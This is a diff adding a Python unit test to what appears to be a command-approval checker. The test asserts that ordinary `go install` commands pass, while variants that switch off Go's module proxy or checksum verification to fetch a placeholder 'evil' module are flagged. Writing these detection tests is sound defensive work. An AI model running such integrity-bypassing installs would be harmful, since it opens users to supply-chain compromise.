@@ -4503,6 +4503,25 @@ class HarmlessStops(unittest.TestCase):
              for o in ("--index-url ", "--index-u ", "--index-url=", "--index-u=")] +
             [("npm install --@acme:registry=https://npm.acme.example ui", "ask", "TK-A025")])
 
+    def test_a_go_install_with_go_s_checks_off_is_held_as_a_direct_fetch(self):
+        """`go install x@v` comes through Go's module proxy and checksum database, a registry with integrity checks, as
+        `cargo install name` does, so it stays allowed (a GOPROXY that falls back to direct, Go's default, too). A line
+        that turns those checks off makes it a direct version-control fetch, held as one (TK-A028): the proxy direct or
+        off, the checksum database off, a variable that exempts modules from either, -insecure; before the command,
+        through env or export, or saved by go env -w."""
+        m = "github.com/evil/x@latest"
+        self.check(
+            ["go install golang.org/x/tools/gopls@latest", "go get golang.org/x/text@v0.14.0",
+             "GOPROXY=https://proxy.golang.org,direct go install golang.org/x/tools/gopls@latest",
+             "GOFLAGS=-mod=mod go install ./cmd/tool", "go env GOPROXY", "GOSUMDB=sum.golang.org go get ./..."],
+            [(cmd, "ask", "TK-A028") for cmd in (
+                f"GOPROXY=direct go install {m}", f"GOPROXY=off go install {m}", f"GOPROXY='direct|off' go get {m}",
+                f"GOSUMDB=off go get {m}", f"GONOSUMDB=github.com/evil go install {m}", f"GONOSUMCHECK=1 go install {m}",
+                f"GOPRIVATE=github.com/evil go install {m}", f"GOINSECURE=github.com/evil go get {m}",
+                f"GONOPROXY=github.com/evil go install {m}", f"GOFLAGS='-mod=mod -insecure' go get {m}",
+                f"go get -insecure {m}", f"env GOPROXY=direct go install {m}", f"export GOSUMDB=off; go install {m}",
+                f"go env -w GOPROXY=direct && go install {m}", "GOSUMDB=off go get ./...")])
+
     def test_a_runner_s_command_is_read_where_a_pipe_reads_one(self):
         """A rule that reads the command after a pipe reads what a runner runs there (shell._lines), hatch's without
         the ENV: it names: a cache flush into a runner's client is held as one into the client (TK-A040)."""
